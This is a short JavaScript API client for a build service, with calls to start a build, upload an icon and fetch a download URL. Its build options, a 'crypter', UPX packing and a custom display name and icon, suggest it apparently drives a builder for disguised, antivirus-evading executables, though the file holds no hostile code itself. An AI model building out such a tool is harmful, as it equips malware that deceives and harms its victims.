import { request } from "./client";
import { r } from "../routes";

export function apiStartBuild(debug, upx, crypter, displayName, iconPath) {
  return request("POST", r.build.start(), { debug, upx, crypter, display_name: displayName, icon_path: iconPath });
}

export function apiUploadIcon(file) {
  const form = new FormData();
  form.append("icon", file);
  return fetch(r.build.icon(), {
    method: "POST",
    credentials: "same-origin",
    body: form,
  }).then(async (res) => {
    const data = await res.json();
    if (!res.ok) throw new Error((data && data.error) || res.statusText);
    return data;
  });
}

export function apiBuildDownloadUrl(file) {
  return r.build.download(file);
}